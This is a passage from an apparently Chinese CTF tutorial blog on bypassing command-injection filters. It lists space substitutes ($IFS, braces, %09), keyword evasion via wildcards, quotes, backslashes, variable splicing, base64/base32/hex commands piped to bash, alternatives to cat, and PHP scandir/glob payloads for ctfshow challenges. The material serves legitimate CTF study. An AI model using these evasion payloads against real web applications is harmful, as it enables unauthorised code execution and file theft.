</div><p>不过一般都是有过滤的，接下来学一下怎么绕过过滤</p>
<h3 id="31空格绕过">3.1空格绕过
</h3><p>下面这些都可以代替空格</p>
<h4 id="ifs代替空格">$IFS代替空格
</h4><p>在Linux中有一个环境变量叫IFS，为内部字段分隔符，可以代替空格</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="err">$</span><span class="p">{</span><span class="nx">IFS</span><span class="p">}</span><span class="err">$</span><span class="mi">9</span><span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{</span><span class="nx">IFS</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="大括号">大括号{}：
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="重定向字符">重定向字符&lt;，&lt;&gt;
</h4><p>例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat&lt;flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="0920绕过">%09,%20绕过
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tac%09flag.php,tac%20flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="32关键词过滤绕过">3.2关键词过滤绕过
</h3><p>比如过滤了flag，怎么搞？</p>
<h4 id="绕过文件名过滤通配符绕过">??,*绕过文件名过滤（通配符绕过）
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">*</span>	<span class="nx">匹配任何字符串／文本，包括空字符串；</span><span class="o">*</span><span class="nx">代表任意字符（0个或多个）</span>
</span></span><span class="line"><span class="cl"><span class="o">?</span>	<span class="nx">匹配任何一个字符（不在括号内时）</span><span class="o">?</span><span class="nx">代表任意1个字符</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">abcd</span><span class="p">]</span>	<span class="nx">匹配指定字符范围内的任意单个字符</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">a</span><span class="o">-</span><span class="nx">z</span><span class="p">]</span>	<span class="nx">表示范围a到z，表示范围的意思</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">配符是由shell处理的</span><span class="p">,</span> <span class="nx">它只会出现在</span> <span class="nx">命令的“参数”里。当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换</span><span class="p">(</span><span class="nx">路径扩展</span><span class="p">)</span><span class="nx">；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符实际上就是一种shell实现的路径扩展功能。在</span> <span class="nx">通配符被处理后</span><span class="p">,</span> <span class="nx">shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">例如我们的flag</span><span class="o">.</span><span class="nx">php文件，我们可以用fla</span><span class="o">*</span><span class="nx">或者fla</span><span class="o">?????</span><span class="nx">去进行模糊匹配，但是这里需要注意，如果目录中有flax这种类似也可以匹配上的文件，系统可能会无法正确做出匹配或者返回多个可以匹配上的文件</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">cat</span> <span class="o">/</span><span class="nx">fl</span><span class="o">??</span>
</span></span><span class="line"><span class="cl"><span class="nx">cat</span> <span class="o">/</span><span class="nx">f</span><span class="o">*</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="单引号双引号反引号绕过正则">单引号(&rsquo;)双引号(&quot;&quot;)反引号(``)绕过正则
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">对php来说这是fl””ag而不是flag关键字不会匹配上，但是对于linux系统来说cat /fl””ag等效于cat /flag。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\进行转义，避免报错
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /fl&#34;&#34;ag
</span></span><span class="line"><span class="cl">c&#34;&#34;at /flag
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="反斜杠绕过">反斜杠绕过
</h4><p>linux看到反斜线\会自动帮你去掉,正常执行命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">ca\t</span> <span class="nx">fl\ag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="1到9和绕过">$1到$9、$@和$*绕过
</h4><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121142836264.png"
	width="511"
	height="125"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121142836264_hu_bf5d45c79685b035.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121142836264_hu_e87ff6c2653ce10a.png 1024w"
	loading="lazy"
	
		alt="image-20251121142836264"
	
	
		class="gallery-image" 
		data-flex-grow="408"
		data-flex-basis="981px"
	
></p>
<h4 id="变量拼接绕过内联执行">变量拼接绕过（内联执行）
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=l;b=s;$a$b	#相当拼出来ls
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121143531654.png"
	width="1732"
	height="54"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121143531654_hu_97197f56d97ebb69.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121143531654_hu_5d09cdae98a6f5ce.png 1024w"
	loading="lazy"
	
		alt="image-20251121143531654"
	
	
		class="gallery-image" 
		data-flex-grow="3207"
		data-flex-basis="7697px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2025HNCTF:Really_Ez_Rce
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="利用base6432编码绕过">利用base64(32)编码绕过
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;(base64编码)&#39;</span> <span class="o">|</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span> <span class="o">|</span> <span class="nx">bash</span>
</span></span><span class="line"><span class="cl"><span class="nx">这里利用了管道符去逐个执行我们的命令，先base64编码输出，然后通过</span><span class="o">|</span><span class="nx">管道符把上一个的输出作为下一个的输入，也就是base64</span> <span class="o">-</span><span class="nx">d的输入，其中</span><span class="o">-</span><span class="nx">d代表着解码，之后再把解码的内容传给bash，解码后的内容会被当成bash命令去执行（sh命令也行）</span>
</span></span><span class="line"><span class="cl"><span class="nx">例如</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;Y2F0IDEucGhw&#39;</span> <span class="o">|</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span> <span class="o">|</span> <span class="nx">bash</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">其中Y2F0IDEucGhw解码后是cat</span> <span class="mf">1.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">当然这里也不一定需要bash，也可以直接用反引号内联执行或者</span><span class="nv">$执行</span>
</span></span><span class="line"><span class="cl"><span class="sb">`echo &#39;Y2F0IDEucGhw&#39; | base64 -d`</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">(</span><span class="k">echo</span> <span class="nx">Y2F0IDEucGhw</span> <span class="o">|</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121143955466.png"
	width="816"
	height="185"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121143955466_hu_9bbb994f078879c7.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121143955466_hu_f605ca27590e077.png 1024w"
	loading="lazy"
	
		alt="image-20251121143955466"
	
	
		class="gallery-image" 
		data-flex-grow="441"
		data-flex-basis="1058px"
	
></p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121144717895.png"
	width="703"
	height="108"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121144717895_hu_ed696b1bad2acc4b.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121144717895_hu_c459fc018638e45b.png 1024w"
	loading="lazy"
	
		alt="image-20251121144717895"
	
	
		class="gallery-image" 
		data-flex-grow="650"
		data-flex-basis="1562px"
	
></p>
<p><strong>base32编码同理</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;MNQXIIBRFZYGQ4A=&#39; | base32 -d | bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>其它base编码不行</p>
<h4 id="利用hex编码绕过">利用hex编码绕过
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;(hex编码)&#39; | xxd -r -p | bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;63 61 74 20 31 2e 70 68 70&#39; | xxd -r -p | bash	#hex解码时cat 1.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121144528769.png"
	width="928"
	height="105"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121144528769_hu_fff8c6adc29cb440.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121144528769_hu_fad8ccd25ac3166d.png 1024w"
	loading="lazy"
	
		alt="image-20251121144528769"
	
	
		class="gallery-image" 
		data-flex-grow="883"
		data-flex-basis="2121px"
	
></p>
<h4 id="利用linux中的环境变量">利用linux中的环境变量
</h4><p>使用环境变量里的字符执行变量</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo $PATH              #PATH默认系统环境变量
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121145926673.png"
	width="572"
	height="50"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121145926673_hu_789a3acded77d07e.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121145926673_hu_7a6f22e17ec3d946.png 1024w"
	loading="lazy"
	
		alt="image-20251121145926673"
	
	
		class="gallery-image" 
		data-flex-grow="1144"
		data-flex-basis="2745px"
	
></p>
<p>然后用类似python的切片操作取字符执行命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${PATH:7:1}at 1.j${PATH:2:1}			#相当于cat 1.js
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121150522951.png"
	width="1079"
	height="207"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121150522951_hu_6f64bd1b25b0ade6.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121150522951_hu_8a9a7d3316ead01f.png 1024w"
	loading="lazy"
	
		alt="image-20251121150522951"
	
	
		class="gallery-image" 
		data-flex-grow="521"
		data-flex-basis="1251px"
	
></p>
<h3 id="33系统读取命令被过滤">3.3系统读取命令被过滤
</h3><p>读文件命令cat被过滤然后然后还绕不过就用其它命令替换</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">tac</span><span class="o">:</span><span class="nx">从最后一行开始显示，可以看成</span> <span class="nx">tac</span> <span class="nx">是</span> <span class="nx">cat</span> <span class="nx">的反向显示</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">strings：相当于cat</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">nl：显示的时候，顺便输出行号</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">uniq：报告或删除文件中重复的行，其实当成cat用就行</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">more：</span>
</span></span><span class="line"><span class="cl"><span class="nx">用于分页查看文件内容。</span>
</span></span><span class="line"><span class="cl"><span class="nx">支持通过空格键向下翻页，b键向上翻页，q键退出查看。</span>
</span></span><span class="line"><span class="cl"><span class="nx">还可以搜索指定文本，并支持设置每屏显示的行数。</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">less：</span>
</span></span><span class="line"><span class="cl"><span class="nx">类似于more，但功能更强大。</span>
</span></span><span class="line"><span class="cl"><span class="nx">支持方向键上下滚动，空格向下翻页，b向上翻页。</span>
</span></span><span class="line"><span class="cl"><span class="nx">可以显示行号，支持搜索指定字符串，并可以方便地查找和浏览文件内容。</span>
</span></span><span class="line"><span class="cl"><span class="nx">使用q键退出查看。</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">head：</span>
</span></span><span class="line"><span class="cl"><span class="nx">用于查看文件的开头部分。</span>
</span></span><span class="line"><span class="cl"><span class="nx">默认显示文件的前10行，但可以通过指定参数来显示更多或更少的行数或字节数。</span>
</span></span><span class="line"><span class="cl"><span class="nx">支持与其他命令结合使用，如管道命令。</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">sort：</span>
</span></span><span class="line"><span class="cl"><span class="nx">用于对文本文件内容进行排序。</span>
</span></span><span class="line"><span class="cl"><span class="nx">支持多种排序方式，如按字母、数字、逆序排序等。</span>
</span></span><span class="line"><span class="cl"><span class="nx">还可以合并已排序的文件，删除重复行，以及检查文件是否已经排序。</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nx">tail：</span>
</span></span><span class="line"><span class="cl"><span class="nx">用于显示文件的末尾内容。</span>
</span></span><span class="line"><span class="cl"><span class="nx">默认显示文件的最后10行，但可以通过指定参数来显示更多行数。</span>
</span></span><span class="line"><span class="cl"><span class="nx">支持实时追踪文件的变化，并持续显示新增的内容，适用于查看日志文件等动态更新的文件。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">od：以二进制方式读取档案内容</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">xxd</span> <span class="o">:</span><span class="nx">左边显示2进制，右边显示编码</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">file</span> <span class="o">-</span><span class="nx">f</span><span class="o">:</span><span class="nx">报错出具体内容</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">grep：在文本中查找指定字符串，比如grep</span> <span class="nx">f</span> <span class="nx">fla</span><span class="o">*</span> <span class="nx">命令会匹配当前目录下所有以</span> <span class="nx">fla</span> <span class="nx">开头的文件（不包括子目录），然后将这些文件中包含字符串</span> <span class="nx">f</span> <span class="nx">的行输出到终端上。因此，这个命令会搜索根目录下以</span> <span class="nx">fla</span> <span class="nx">开头的所有文件，并匹配其中包含</span> <span class="nx">f</span> <span class="nx">字符串的行。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152116595.png"
	width="757"
	height="229"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152116595_hu_b19ce7b9227356bc.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152116595_hu_d522d8ea644d362b.png 1024w"
	loading="lazy"
	
		alt="image-20251121152116595"
	
	
		class="gallery-image" 
		data-flex-grow="330"
		data-flex-basis="793px"
	
></p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152315141.png"
	width="1188"
	height="119"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152315141_hu_142a361811974f03.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152315141_hu_8d6de6fddf115ae0.png 1024w"
	loading="lazy"
	
		alt="image-20251121152315141"
	
	
		class="gallery-image" 
		data-flex-grow="998"
		data-flex-basis="2395px"
	
></p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152721437.png"
	width="1683"
	height="251"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152721437_hu_6743e0c02ebcfd50.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251121152721437_hu_f5b02dc64ed79b9c.png 1024w"
	loading="lazy"
	
		alt="image-20251121152721437"
	
	
		class="gallery-image" 
		data-flex-grow="670"
		data-flex-basis="1609px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ctfshow:42-57
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="34命令执行中无字母rce">3.4:命令执行中无字母rce
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ctfshow55-57
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="四php文件操作">四：php文件操作
</h2><h3 id="41查看目录">4.1查看目录
</h3><p>单独讲一下php中读取文件的函数，为什么？当eval中执行命令的函全被禁用就得用文件读取函数读flag，在ctfshow58-77考的就是这个。而且也为下面讲无参数rce铺垫一下</p>
<p>查看文件目录的命令有</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="nx">c</span><span class="o">=</span><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">));</span><span class="c1">#查看当前目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">c</span><span class="o">=</span><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">));</span><span class="c1">#查看根目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">c</span><span class="o">=</span><span class="nx">print_r</span><span class="p">(</span><span class="nx">glob</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">));</span><span class="c1">#查看当前目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">c</span><span class="o">=</span><span class="nx">print_r</span><span class="p">(</span><span class="nx">glob</span><span class="p">(</span><span class="s1">&#39;/*&#39;</span><span class="p">));</span><span class="c1">#查看根目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
</span></span><span class="line"><span class="cl"> <span class="nx">c</span><span class="o">=</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">));</span><span class="c1">#查看当前目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">c</span><span class="o">=</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">));</span><span class="c1">#查看根目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">c</span><span class="o">=</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">glob</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">));</span><span class="c1">#查看当前目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">c</span><span class="o">=</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">glob</span><span class="p">(</span><span class="s1">&#39;/*&#39;</span><span class="p">));</span><span class="c1">#查看根目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
</span></span><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="nx">var_export</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">));</span><span class="c1">#查看当前目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">c</span><span class="o">=</span><span class="nx">var_export</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">));</span><span class="c1">#查看根目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">c</span><span class="o">=</span><span class="nx">var_export</span><span class="p">(</span><span class="nx">glob</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">));</span><span class="c1">#查看当前目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">c</span><span class="o">=</span><span class="nx">var_exportdump</span><span class="p">(</span><span class="nx">glob</span><span class="p">(</span><span class="s1">&#39;/*&#39;</span><span class="p">));</span><span class="c1">#查看根目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s1">&#39;glob:///*&#39;</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$a</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="p">);}</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">#扫描根目录有什么文件，例题（ctfshow72题与2024basectf-flag直接读取不就行了？）
